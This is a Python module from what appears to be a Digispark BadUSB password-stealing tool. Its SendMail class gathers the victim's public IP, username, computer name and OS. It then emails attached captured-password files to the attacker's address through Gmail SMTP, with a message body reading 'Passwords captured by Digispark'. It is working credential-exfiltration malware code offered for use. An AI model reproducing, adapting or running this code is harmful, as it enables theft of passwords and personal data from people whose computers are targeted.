import os
import platform
import smtplib
import subprocess
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


class SendMail:
    def __init__(self, _source_mail, _source_pass, _dest_mail, files):
        self.source_mail = _source_mail
        self.source_pass = _source_pass
        self.dest_mail = _dest_mail
        self.files = files

        self.send_message()

    def get_ip(self):
        try:
            data = subprocess.check_output('nslookup myip.opendns.com resolver1.opendns.com', stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE, shell=True, timeout=0.7)
        except:
            return 'Not Found'

        try:
            ip = data.decode('cp866', errors='ignore').strip().split(':')[-1][2:]
        except:
            try:
                ip = data.decode(errors='ignore').strip().split(':')[-1][2:]
            except:
                return data
        return ip

    def get_text_mail(self):
        ip = self.get_ip()
        OS = f'{platform.platform()} - {str(platform.architecture()[0])}'
        return f"Passwords captured by Digispark.\n" \
            f"IP: {ip}\n" \
            f"User: {os.getlogin()}\n" \
            f"Computer: {os.getenv('COMPUTERNAME')}\n" \
            f"OS: {OS}\n\n\n" \
            f"------------\n" \
            f"Developed by @kovinevmv\n"

    def send_message(self):
        subject = 'Digispark - User: ' + os.getlogin()
        text = self.get_text_mail()

        msg = MIMEMultipart()
        msg['From'] = self.source_mail
        msg['To'] = ", ".join(self.dest_mail)
        msg['Subject'] = subject

        msg.attach(MIMEText(text))
        for f in self.files:
            attachment = MIMEApplication(open(f, "rb").read(), _subtype="txt")
            attachment.add_header('Content-Disposition', 'attachment', filename=f)
            msg.attach(attachment)

        try:
            mailServer = smtplib.SMTP("smtp.gmail.com", 587)
            mailServer.ehlo()
            mailServer.starttls()
            mailServer.login(self.source_mail, self.source_pass)
            mailServer.sendmail(self.source_mail, self.dest_mail, msg.as_string())
            mailServer.close()
        except:
            pass


if __name__ == '__main__':
    pass
